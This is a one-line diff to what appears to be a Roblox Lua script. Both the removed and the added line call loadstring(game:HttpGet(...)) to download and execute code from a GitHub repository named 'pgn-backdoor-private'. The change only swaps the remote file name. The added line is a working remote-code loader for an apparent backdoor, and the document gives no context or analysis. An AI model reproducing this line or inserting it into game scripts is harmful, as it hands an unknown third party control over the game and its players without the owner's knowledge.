@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MRarts/pgn-backdoor-private/refs/heads/main/code"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MRarts/pgn-backdoor-private/refs/heads/main/2n"))()
